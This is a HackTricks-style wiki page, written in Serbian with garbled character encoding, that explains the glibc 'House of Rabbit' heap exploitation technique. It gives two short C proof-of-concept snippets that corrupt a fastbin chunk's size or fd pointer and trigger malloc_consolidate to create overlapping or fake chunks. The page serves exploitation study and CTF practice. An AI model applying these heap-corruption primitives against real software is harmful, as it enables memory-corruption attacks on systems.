# House of Rabbit

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### Requirements

1. **Sposobnost modifikacije fast bin fd pokazivaÄa ili veliÄine**: To znaÄi da moÅ¾ete promeniti pokazivaÄ napred na delu u fastbinu ili njegovu veliÄinu.
2. **Sposobnost da pokrenete `malloc_consolidate`**: To se moÅ¾e uraditi ili alokacijom velikog dela ili spajanjem gornjeg dela, Å¡to prisiljava heap da konsoliduje delove.

### Goals

1. **Kreirati preklapajuÄ‡e delove**: Da jedan deo preklapa drugi, omoguÄ‡avajuÄ‡i dalju manipulaciju heap-om.
2. **Falsifikovati laÅ¾ne delove**: Da prevarite alokator da tretira laÅ¾ni deo kao legitimni deo tokom operacija na heap-u.

## Steps of the attack

### POC 1: Modifikujte veliÄinu fast bin dela

**Cilj**: Kreirati preklapajuÄ‡i deo manipulacijom veliÄine fastbin dela.

* **Korak 1: Alocirajte delove**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x40);  // Allocates another chunk of 0x40 bytes at 0x602050
malloc(0x10);                          // Allocates a small chunk to change the fastbin state
```
Dodeljujemo dva dela od po 0x40 bajta. Ovi delovi Ä‡e biti smeÅ¡teni u brzi bin list nakon Å¡to budu osloboÄ‘eni.

* **Step 2: Free Chunks**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
free(chunk2);  // Frees the chunk at 0x602050
```
Osoba oslobaÄ‘a oba dela, dodajuÄ‡i ih na fastbin listu.

* **Korak 3: Izmeni VeliÄinu Dela**
```cpp
chunk1[-1] = 0xa1;  // Modify the size of chunk1 to 0xa1 (stored just before the chunk at chunk1[-1])
```
Menjamo veliÄinu metapodataka `chunk1` na 0xa1. Ovo je kljuÄni korak da prevarimo alokator tokom konsolidacije.

* **Korak 4: Aktiviraj `malloc_consolidate`**
```cpp
malloc(0x1000);  // Allocate a large chunk to trigger heap consolidation
```
Allociranje velikog dela aktivira funkciju `malloc_consolidate`, spajajuÄ‡i male delove u brzi bin. Manipulisana veliÄina `chunk1` uzrokuje da se preklapa sa `chunk2`.

Nakon konsolidacije, `chunk1` se preklapa sa `chunk2`, omoguÄ‡avajuÄ‡i dalju eksploataciju.

### POC 2: Izmeniti `fd` pokazivaÄ

**Cilj**: Kreirati laÅ¾ni deo manipulacijom `fd` pokazivaÄa brzog bina.

* **Korak 1: Alocirajte delove**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x100); // Allocates a chunk of 0x100 bytes at 0x602050
```
**ObjaÅ¡njenje**: Alociramo dva dela, jedan manji i jedan veÄ‡i, da postavimo heap za laÅ¾ni deo.

* **Korak 2: Kreiraj laÅ¾ni deo**
```cpp
chunk2[1] = 0x31;  // Fake chunk size 0x30
chunk2[7] = 0x21;  // Next fake chunk
chunk2[11] = 0x21; // Next-next fake chunk
```
PiÅ¡emo laÅ¾ne metapodatke o delu u `chunk2` da simuliramo manje delove.

* **Korak 3: Oslobodi `chunk1`**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
```
**ObjaÅ¡njenje**: OslobaÄ‘amo `chunk1`, dodajuÄ‡i ga na fastbin listu.

* **Korak 4: Izmenite `fd` od `chunk1`**
```cpp
chunk1[0] = 0x602060;  // Modify the fd of chunk1 to point to the fake chunk within chunk2
```
**ObjaÅ¡njenje**: Menjamo prednji pokazivaÄ (`fd`) `chunk1` da pokazuje na naÅ¡ laÅ¾ni chunk unutar `chunk2`.

* **Korak 5: Aktiviraj `malloc_consolidate`**
```cpp
malloc(5000);  // Allocate a large chunk to trigger heap consolidation
```
Allociranje velikog dela ponovo pokreÄ‡e `malloc_consolidate`, koji obraÄ‘uje laÅ¾ni deo.

LaÅ¾ni deo postaje deo fastbin liste, ÄineÄ‡i ga legitimnim delom za dalju eksploataciju.

### Rezime

Tehnika **House of Rabbit** ukljuÄuje ili modifikovanje veliÄine fast bin dela kako bi se stvorili preklapajuÄ‡i delovi ili manipulaciju `fd` pokazivaÄem za kreiranje laÅ¾nih delova. Ovo omoguÄ‡ava napadaÄima da falsifikuju legitimne delove u heap-u, omoguÄ‡avajuÄ‡i razliÄite oblike eksploatacije. Razumevanje i veÅ¾banje ovih koraka poboljÅ¡aÄ‡e vaÅ¡e veÅ¡tine eksploatacije heap-a.

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
